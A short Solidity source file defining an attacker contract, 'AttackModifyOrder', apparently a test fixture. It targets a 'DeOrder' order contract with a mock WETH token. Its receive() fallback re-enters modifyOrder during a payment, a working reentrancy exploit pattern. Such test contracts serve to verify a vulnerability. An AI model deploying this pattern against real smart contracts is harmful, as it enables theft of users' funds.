import {DeOrder} from "contracts/DeOrder.sol";
import {WETH} from "contracts/mock/WETH.sol";

contract AttackModifyOrder {
    DeOrder public deOrder;
    WETH public weth;
    address token;
    constructor(DeOrder _deOrder, WETH _weth,address _token) {
        deOrder = _deOrder;
        weth = _weth;
        token = _token;
    }
    receive() external payable {
        if (weth.totalSupply() >= 1 ether) {
            deOrder.modifyOrder(2, token, 1 ether);
        }
    }

    function attack() external payable {
        deOrder.createOrder(
            0,
            address(this),
            address(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf),
            address(0),
            100
        );
        deOrder.payOrder{value: 1 ether}(2, 1 ether); // pay
        deOrder.modifyOrder(2, token, 1 ether);
    }
}
